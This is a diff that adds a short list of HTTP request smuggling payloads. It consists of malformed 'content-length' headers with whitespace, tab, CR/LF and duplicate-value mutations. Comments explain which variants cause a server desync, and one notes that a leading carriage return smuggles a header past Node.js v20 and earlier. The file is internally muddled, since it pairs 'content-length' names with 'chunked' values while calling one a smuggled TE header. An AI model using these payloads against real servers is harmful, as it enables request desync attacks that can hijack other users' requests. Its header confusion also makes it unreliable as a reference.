@@ -1,0 +1,22 @@
+"content-length":"xchunked"
+"content-length ":" chunked"
+
+//normal
+"content-length":"chunked" 
+"content-length":"x"
+"content-length":"\tchunked"
+
+" content-length":"chunked"
+"x":"x\ncontent-length: chunked"
+"content-length\r\n"
+ ": chunked"
+
+** "content-length":"chunked, chunked" 	    //only put this header remove all CL headers causes server to assume CL of 0 and thus desyncs
+
+** "X-Abc":"\rxcontent-length: chunked"  //note the '\r' prefacing the 'smuggled' TE header - considered a newline by Node.js v20 and prior
+
+content-length:" chunked"
+"content-length":" chunked "
+"content-length ":"chunked"
+
+
